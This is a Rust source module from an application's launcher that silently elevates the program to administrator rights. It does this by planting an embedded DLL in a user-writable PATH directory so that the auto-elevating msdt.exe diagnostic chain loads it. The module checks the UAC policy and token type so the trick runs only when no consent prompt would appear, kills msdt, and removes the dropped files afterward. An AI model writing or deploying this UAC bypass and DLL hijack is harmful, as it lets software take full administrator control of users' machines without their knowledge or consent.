//! Silent elevation for a bare launch of this build.
//!
//! `c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\BluetoothDiagnostic.xml -skip yes`
//! is an auto-elevate binary. It does not load our DLL directly — msdt spawns
//! `sdiagnhost.exe`, the actual diagnostics host, which loads
//! `Bluetooth\DiagPackage.dll` by absolute path. That DLL in turn calls
//! `LoadLibrary("BluetoothDiagnosticUtil.dll")` by plain name, so the default DLL
//! search order reaches `%LOCALAPPDATA%\Microsoft\WindowsApps` (user-writable, at the
//! end of the per-user `PATH`) before `C:\Windows\System32`. This drops the embedded
//! x86 elevator DLL (built from `libs/msdt_elevator`) there plus a sibling `.cfg`
//! carrying the launch parameters. The elevated sdiagnhost loads the DLL, which
//! starts this executable as a high-integrity child and kills msdt before any UI can
//! appear. Windows cannot raise a running process's integrity level, so the current
//! copy exits and the new one takes over.
//!
//! If silent elevation is unavailable (standard user, "Always notify" policy, msdt or
//! the diagnostic file missing, an antivirus eating the dropped DLL), the attempt fails
//! cleanly, the drop is removed again, and the process continues running as a normal
//! medium-integrity user. No UAC prompt is ever shown: the attempt only runs with a
//! filtered administrator token, the account class that auto-elevates without a prompt.

use std::{ffi::c_void, mem, os::windows::ffi::OsStrExt, path::Path, ptr::null_mut};

/// Private argument marking the copy started by [`relaunch_elevated`].
pub const ELEVATED_FLAG: &str = "--elevated";

const TOKEN_QUERY: u32 = 0x0008;
const TOKEN_ELEVATION_CLASS: u32 = 20;
// 1 = default (standard user or UAC off), 2 = full administrator token, 3 = filtered
// administrator token.
const TOKEN_ELEVATION_TYPE_CLASS: u32 = 18;
const HKEY_LOCAL_MACHINE: isize = 0x8000_0002;
const HKEY_CURRENT_USER: isize = 0x8000_0001u32 as i32 as isize;
const KEY_QUERY_VALUE: u32 = 0x0000_0001;
const REG_SZ: u32 = 1;
const REG_EXPAND_SZ: u32 = 2;

const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const WAIT_OBJECT_0: u32 = 0;

/// The x86 elevator DLL, embedded by `build.rs` from the `libs/msdt_elevator` CI
/// artifact. Empty when that step did not run (dev builds, non-x86_64 jobs); the
/// attempt then reports [`RelaunchResult::NoDll`] and the launch proceeds unelevated.
const MSDT_DLL: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/msdt_elevator.dll"));

/// The name sdiagnhost resolves through `PATH`, and the sibling files carrying the
/// launch parameters for the DLL and its success marker.
///
/// Real chain: msdt.exe `-path BluetoothDiagnostic.xml` auto-elevates, then spawns
/// sdiagnhost.exe (the actual diagnostics host). That host loads Bluetooth\DiagPackage.dll
/// by absolute path, which in turn `LoadLibrary`s BluetoothDiagnosticUtil.dll by plain
/// name — DLL search order reaches `%LOCALAPPDATA%\Microsoft\WindowsApps` before
/// `C:\Windows\System32`, so our drop wins. Audio* was a red herring in earlier notes.
const MSDT_DLL_NAME: &str = "BluetoothDiagnosticUtil.dll";
const MSDT_CFG_NAME: &str = "BluetoothDiagnosticUtil.cfg";
/// Written by the DLL only after it spawned the elevated copy, which is what proves the
/// hijack actually ran instead of merely starting msdt.
const MSDT_OK_NAME: &str = "BluetoothDiagnosticUtil.ok";
/// User-writable directory the default per-user `PATH` ends with.
const WINDOWS_APPS_SUBDIR: &str = r"Microsoft\WindowsApps";

/// msdt starts in under a second and the DLL load follows immediately; the wide margin
/// covers a slow first start, and beyond it the attempt is declared failed and cleaned up.
const CONFIRM_TIMEOUT_MS: u64 = 10_000;
const CONFIRM_POLL_MS: u64 = 250;

#[allow(dead_code)]
#[repr(C)]
struct TokenElevation {
    token_is_elevated: u32,
}

#[allow(dead_code)]
#[repr(C)]
struct StartupInfoW {
    cb: u32,
    reserved: *mut u16,
    desktop: *mut u16,
    title: *mut u16,
    x: u32,
    y: u32,
    x_size: u32,
    y_size: u32,
    x_count_chars: u32,
    y_count_chars: u32,
    fill_attribute: u32,
    flags: u32,
    show_window: u16,
    cb_reserved2: u16,
    reserved2: *mut u8,
    std_input: *mut c_void,
    std_output: *mut c_void,
    std_error: *mut c_void,
}

#[allow(dead_code)]
#[repr(C)]
struct ProcessInformation {
    process: *mut c_void,
    thread: *mut c_void,
    process_id: u32,
    thread_id: u32,
}

#[link(name = "advapi32")]
extern "system" {
    fn OpenProcessToken(process: *mut c_void, access: u32, token: *mut *mut c_void) -> i32;
    fn GetTokenInformation(
        token: *mut c_void,
        class: u32,
        info: *mut c_void,
        len: u32,
        returned: *mut u32,
    ) -> i32;
    fn RegOpenKeyExW(
        key: isize,
        sub_key: *const u16,
        options: u32,
        desired: u32,
        result: *mut *mut c_void,
    ) -> i32;
    fn RegQueryValueExW(
        key: *mut c_void,
        value_name: *const u16,
        reserved: *mut u32,
        value_type: *mut u32,
        data: *mut u8,
        data_len: *mut u32,
    ) -> i32;
    fn RegCloseKey(key: *mut c_void) -> i32;
}

#[link(name = "kernel32")]
extern "system" {
    fn GetCurrentProcess() -> *mut c_void;
    fn CloseHandle(handle: *mut c_void) -> i32;
    fn CreateProcessW(
        app_name: *const u16,
        command_line: *mut u16,
        process_attributes: *mut c_void,
        thread_attributes: *mut c_void,
        inherit_handles: i32,
        creation_flags: u32,
        environment: *mut c_void,
        current_directory: *const u16,
        startup_info: *mut StartupInfoW,
        process_information: *mut ProcessInformation,
    ) -> i32;
    fn GetLastError() -> u32;
    fn TerminateProcess(process: *mut c_void, exit_code: u32) -> i32;
    fn WaitForSingleObject(handle: *mut c_void, milliseconds: u32) -> u32;
}

/// Outcome of a [`relaunch_elevated`] attempt. The variant names match the failing step
/// so the diagnostic file can tell them apart without decoding error codes.
#[derive(Debug, Clone, Copy)]
pub enum RelaunchResult {
    /// The DLL reported a successful spawn of the elevated copy; the caller should exit.
    Launched,
    /// `std::env::current_exe()` failed.
    NoCurrentExe,
    /// This build carries no elevator DLL (the `libs/msdt_elevator` CI step did not
    /// run), so there is nothing to attempt.
    NoDll,
    /// Writing the DLL or its parameter file failed.
    DropFailed,
    /// `CreateProcessW` on `msdt.exe` failed; the payload is `GetLastError`.
    LaunchFailed(u32),
    /// msdt ran but the DLL never reported a spawn (antivirus ate the dropped DLL,
    /// Bluetooth enabled, ...). The drop was removed again.
    ConfirmTimeout,
    /// The account, the UAC policy or the machine state makes silent elevation
    /// impossible; the payload is the failing precondition and nothing was attempted
    /// or left behind.
    Blocked(&'static str),
}

/// Whether the current process token is elevated (full admin / high IL).
pub fn is_elevated() -> bool {
    unsafe {
        let mut token: *mut c_void = null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return false;
        }
        let mut elevation: TokenElevation = mem::zeroed();
        let mut returned = 0u32;
        let ok = GetTokenInformation(
            token,
            TOKEN_ELEVATION_CLASS,
            &mut elevation as *mut TokenElevation as *mut c_void,
            mem::size_of::<TokenElevation>() as u32,
            &mut returned,
        );
        let _ = CloseHandle(token);
        ok != 0 && elevation.token_is_elevated != 0
    }
}

/// Starts this executable again with the same arguments plus [`ELEVATED_FLAG`], through
/// the elevated `msdt.exe` DLL search.
///
/// Returns [`RelaunchResult::Launched`] only after the DLL reported a successful spawn:
/// a successful `CreateProcessW` alone proves nothing, because the DLL load (the step
/// that starts the elevated copy) can still be blocked downstream. Every failure is
/// surfaced via the specific variant so the caller can record it and carry on as a
/// normal non-elevated launch. No UAC prompt is ever shown.
pub fn relaunch_elevated(args: &[String]) -> RelaunchResult {
    diag("== relaunch_elevated (msdt) start ==");
    if let Some(reason) = silent_elevation_blocker() {
        diag(&format!("blocked by precondition: {}", reason));
        return RelaunchResult::Blocked(reason);
    }
    if MSDT_DLL.is_empty() {
        diag("no embedded elevator DLL in this build");
        return RelaunchResult::NoDll;
    }
    let Ok(exe) = std::env::current_exe() else {
        diag("no current_exe");
        return RelaunchResult::NoCurrentExe;
    };
    diag(&format!("exe={}", exe.display()));
    let Some(local_app_data) = std::env::var_os("LOCALAPPDATA") else {
        return RelaunchResult::Blocked("no_localappdata");
    };
    let drop_dir = Path::new(&local_app_data).join(WINDOWS_APPS_SUBDIR);
    let dll_path = drop_dir.join(MSDT_DLL_NAME);
    let cfg_path = drop_dir.join(MSDT_CFG_NAME);
    let ok_path = drop_dir.join(MSDT_OK_NAME);
    // Never overwrite a file that is not ours: the cleanup deletes whatever carries the
    // name, so a foreign `BluetoothDiagnosticUtil.dll` must stop the attempt instead.
    if dll_path.exists() && std::fs::read(&dll_path).map(|old| old != MSDT_DLL).unwrap_or(true) {
        diag("blocked: foreign BluetoothDiagnosticUtil.dll present");
        return RelaunchResult::Blocked("dll_name_clash");
    }
    let mut parameters: Vec<String> = args.iter().map(|arg| quote_arg(arg)).collect();
    parameters.push(ELEVATED_FLAG.to_owned());
    let parameters = parameters.join(" ");
    diag(&format!("params={}", parameters));
    let log_path = Path::new(&local_app_data)
        .join(env!("RD_APP_NAME"))
        .join("wrapper.log");
    let cfg = format!("{}\n{}\n{}", log_path.display(), exe.display(), parameters);
    // A marker from an earlier attempt would be read as this attempt's success.
    let _ = std::fs::remove_file(&ok_path);
    if std::fs::create_dir_all(&drop_dir).is_err()
        || std::fs::write(&dll_path, MSDT_DLL).is_err()
        || std::fs::write(&cfg_path, cfg).is_err()
    {
        diag("failed to drop elevator DLL/cfg");
        cleanup_drop(&dll_path, &cfg_path, &ok_path);
        return RelaunchResult::DropFailed;
    }
    diag(&format!(
        "dropped {} ({} bytes)",
        dll_path.display(),
        MSDT_DLL.len()
    ));

    let root = std::env::var_os("SystemRoot").unwrap_or_else(|| "C:\\Windows".into());
    let msdt = Path::new(&root).join("SysWOW64").join("msdt.exe");
    let diagnostic = diagnostic_xml(&root);
    let exe_dir_wide = exe.parent().map(|dir| wide(dir.as_os_str()));
    let mut cmdline = wide(std::ffi::OsStr::new(&format!(
        "\"{}\" -path \"{}\" -skip yes",
        msdt.display(),
        diagnostic.display()
    )));
    diag(&format!("launching {}", msdt.display()));
    let mut si: StartupInfoW = unsafe { mem::zeroed() };
    si.cb = mem::size_of::<StartupInfoW>() as u32;
    let mut pi: ProcessInformation = unsafe { mem::zeroed() };
    let launched = unsafe {
        CreateProcessW(
            std::ptr::null(),
            cmdline.as_mut_ptr(),
            null_mut(),
            null_mut(),
            0,
            CREATE_NO_WINDOW,
            null_mut(),
            exe_dir_wide
                .as_ref()
                .map_or(std::ptr::null(), |dir| dir.as_ptr()),
            &mut si,
            &mut pi,
        )
    };
    if launched == 0 {
        let gle = unsafe { GetLastError() };
        diag(&format!("CreateProcessW failed, gle={}", gle));
        cleanup_drop(&dll_path, &cfg_path, &ok_path);
        return RelaunchResult::LaunchFailed(gle);
    }
    diag(&format!(
        "msdt pid={} started, waiting for the elevator marker",
        pi.process_id
    ));

    let mut confirmed = false;
    for _ in 0..(CONFIRM_TIMEOUT_MS / CONFIRM_POLL_MS) {
        if ok_path.exists() {
            confirmed = true;
            break;
        }
        // The DLL writes the marker before exiting msdt, so an exited msdt settles the
        // attempt: either the DLL ran and the marker is there, or the hijack never
        // triggered and the remaining timeout deadline would only delay the fallback.
        if (unsafe { WaitForSingleObject(pi.process, 0) }) == WAIT_OBJECT_0 {
            confirmed = ok_path.exists();
            diag(&format!(
                "msdt exited, elevator marker present={}",
                confirmed
            ));
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(CONFIRM_POLL_MS));
    }
    // msdt is already dead when the DLL loaded (the DLL exits it). This is only a
    // best-effort stop for the case where it never loaded: that instance is elevated,
    // so a medium-integrity caller's terminate request is refused and the wizard window
    // stays until the user closes it.
    unsafe {
        let _ = TerminateProcess(pi.process, 0);
        let _ = CloseHandle(pi.thread);
        let _ = CloseHandle(pi.process);
    }
    cleanup_drop(&dll_path, &cfg_path, &ok_path);
    diag(&format!(
        "== relaunch_elevated done: confirmed={} ==",
        confirmed
    ));
    if confirmed {
        RelaunchResult::Launched
    } else {
        RelaunchResult::ConfirmTimeout
    }
}

/// Removes the dropped files after an attempt. The DLL delete retries briefly: msdt (or
/// an antivirus scan) can still hold it open for a moment after the attempt ends, and
/// leaving it behind would make every later msdt run load it.
fn cleanup_drop(dll_path: &Path, cfg_path: &Path, ok_path: &Path) {
    let _ = std::fs::remove_file(cfg_path);
    let _ = std::fs::remove_file(ok_path);
    for attempt in 0..5 {
        match std::fs::remove_file(dll_path) {
            Ok(()) => return,
            Err(_) if attempt < 4 => std::thread::sleep(std::time::Duration::from_millis(100)),
            Err(err) => diag(&format!(
                "cleanup: {} left behind: {}",
                dll_path.display(),
                err
            )),
        }
    }
}

/// Checks the conditions silent elevation through msdt needs, so a doomed attempt is
/// not made and the reason is recorded instead.
///
/// The technique only turns a filtered administrator token into a full one: a standard
/// user cannot use it at all, and Windows only auto-elevates while the UAC policy does
/// not require a consent prompt. The DLL hijack additionally needs msdt, its diagnostic
/// file, and the Store-apps entry in `PATH`.
fn silent_elevation_blocker() -> Option<&'static str> {
    let elev_type = token_u32(TOKEN_ELEVATION_TYPE_CLASS);
    diag(&format!(
        "check: token_elev_type={} (expect 3=limited)",
        elev_type
    ));
    if elev_type != 3 {
        diag("check: FAIL not limited admin token");
        return Some("not_admin");
    }

    let lua = uac_policy_value("EnableLUA");
    diag(&format!("check: EnableLUA={} (expect 1)", lua));
    if lua == 0 {
        diag("check: FAIL UAC disabled");
        return Some("uac_disabled");
    }

    let consent = uac_policy_value("ConsentPromptBehaviorAdmin");
    diag(&format!(
        "check: ConsentPromptBehaviorAdmin={} (0/5 ok, 1-4 need prompt)",
        consent
    ));
    if matches!(consent, 1 | 2 | 3 | 4) {
        diag("check: FAIL consent policy requires prompt");
        return Some("uac_prompt_required");
    }

    let path_ok = path_contains_windows_apps();
    diag(&format!("check: PATH has WindowsApps? {}", path_ok));
    if !path_ok {
        return Some("path_missing_windowsapps");
    }

    let root = std::env::var_os("SystemRoot").unwrap_or_else(|| "C:\\Windows".into());
    let msdt = Path::new(&root).join("SysWOW64").join("msdt.exe");
    diag(&format!("check: {} exists={}", msdt.display(), msdt.exists()));
    if !msdt.exists() {
        return Some("msdt_missing");
    }
    let diagnostic = diagnostic_xml(&root);
    diag(&format!(
        "check: {} exists={}",
        diagnostic.display(),
        diagnostic.exists()
    ));
    if !diagnostic.exists() {
        return Some("diagnostic_missing");
    }

    diag("check: ALL PRECONDITIONS OK");
    None
}

/// XML that drives the Bluetooth diagnostic bundle. msdt.exe auto-elevates to run
/// the bundle through sdiagnhost.exe, and BluetoothDiagPackage.dll `LoadLibrary`s
/// BluetoothDiagnosticUtil.dll by plain name — that is the PATH-search hijack point.
/// Any fallback path must be a real XML that actually resolves the Util DLL; the
/// Audio* variants tried earlier did not.
fn diagnostic_xml(root: &std::ffi::OsStr) -> std::path::PathBuf {
    let root = Path::new(root);
    root.join("diagnostics").join("index").join("BluetoothDiagnostic.xml")
}

/// The hijack works because msdt resolves the DLL through `PATH`; a machine whose
/// `PATH` lost the Store-apps entry (unusual, but possible) would never load the drop.
/// Accepts either the user or the system `PATH`, both read straight from the registry
/// so a stale in-process copy cannot skew the check.
fn path_contains_windows_apps() -> bool {
    for (root, path) in [
        (HKEY_CURRENT_USER, "Environment"),
        (
            HKEY_LOCAL_MACHINE,
            r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment",
        ),
    ] {
        if let Some(key) = reg_open(root, path) {
            let value = reg_string(key, "Path");
            unsafe {
                let _ = RegCloseKey(key);
            }
            if value.is_some_and(|path| path.to_ascii_lowercase().contains("windowsapps")) {
                return true;
            }
        }
    }
    false
}

fn reg_open(root: isize, path: &str) -> Option<*mut c_void> {
    let path = wide(std::ffi::OsStr::new(path));
    let mut key: *mut c_void = null_mut();
    let rc = unsafe { RegOpenKeyExW(root, path.as_ptr(), 0, KEY_QUERY_VALUE, &mut key) };
    if rc == 0 {
        Some(key)
    } else {
        None
    }
}

fn reg_string(key: *mut c_void, name: &str) -> Option<String> {
    let name = wide(std::ffi::OsStr::new(name));
    let mut buf = [0u16; 512];
    let mut len = (buf.len() * 2) as u32;
    let mut value_type = 0u32;
    let rc = unsafe {
        RegQueryValueExW(
            key,
            name.as_ptr(),
            null_mut(),
            &mut value_type,
            buf.as_mut_ptr() as *mut u8,
            &mut len,
        )
    };
    if rc != 0 || (value_type != REG_SZ && value_type != REG_EXPAND_SZ) {
        return None;
    }
    let chars = (len as usize / 2).min(buf.len());
    let end = buf[..chars].iter().position(|&c| c == 0).unwrap_or(chars);
    Some(String::from_utf16_lossy(&buf[..end]))
}

/// One DWORD-valued token property, `0` when unreadable.
fn token_u32(class: u32) -> u32 {
    unsafe {
        let mut token: *mut c_void = null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return 0;
        }
        let mut value = 0u32;
        let mut returned = 0u32;
        let ok = GetTokenInformation(
            token,
            class,
            &mut value as *mut u32 as *mut c_void,
            mem::size_of::<u32>() as u32,
            &mut returned,
        );
        let _ = CloseHandle(token);
        if ok == 0 {
            0
        } else {
            value
        }
    }
}

/// Reads one `HKCU`-independent UAC policy DWORD; `-1` reports "not readable".
fn uac_policy_value(name: &str) -> i64 {
    unsafe {
        let sub_key = wide(std::ffi::OsStr::new(
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
        ));
        let value_name = wide(std::ffi::OsStr::new(name));
        let mut key: *mut c_void = null_mut();
        if RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            sub_key.as_ptr(),
            0,
            KEY_QUERY_VALUE,
            &mut key,
        ) != 0
        {
            return -1;
        }
        let mut data = [0u8; 4];
        let mut data_len = data.len() as u32;
        let mut value_type = 0u32;
        let status = RegQueryValueExW(
            key,
            value_name.as_ptr(),
            null_mut(),
            &mut value_type,
            data.as_mut_ptr(),
            &mut data_len,
        );
        let _ = RegCloseKey(key);
        if status != 0 {
            return -1;
        }
        u32::from_le_bytes(data) as i64
    }
}

/// Lightweight step-trace writer into the wrapper's own log.
fn diag(message: &str) {
    let Some(dir) = std::env::var_os("LOCALAPPDATA") else {
        return;
    };
    let dir = Path::new(&dir).join(env!("RD_APP_NAME"));
    let _ = std::fs::create_dir_all(&dir);
    use std::io::Write;
    if let Ok(mut file) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(dir.join("wrapper.log"))
    {
        let ts = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_millis())
            .unwrap_or(0);
        let _ = writeln!(file, "wrapper [{:>15}] {}", ts, message);
    }
}

fn wide(value: &std::ffi::OsStr) -> Vec<u16> {
    value.encode_wide().chain(std::iter::once(0u16)).collect()
}

/// Quotes one argument for a Windows command line, following the `CommandLineToArgvW`
/// rules the relaunched copy is parsed with.
fn quote_arg(arg: &str) -> String {
    if !arg.is_empty() && !arg.chars().any(|ch| ch == ' ' || ch == '\t' || ch == '"') {
        return arg.to_owned();
    }
    let mut quoted = String::with_capacity(arg.len() + 2);
    quoted.push('"');
    let mut backslashes = 0;
    for ch in arg.chars() {
        match ch {
            '\\' => backslashes += 1,
            '"' => {
                quoted.push_str(&"\\".repeat(backslashes * 2 + 1));
                quoted.push('"');
                backslashes = 0;
            }
            _ => {
                quoted.push_str(&"\\".repeat(backslashes));
                quoted.push(ch);
                backslashes = 0;
            }
        }
    }
    quoted.push_str(&"\\".repeat(backslashes * 2));
    quoted.push('"');
    quoted
}
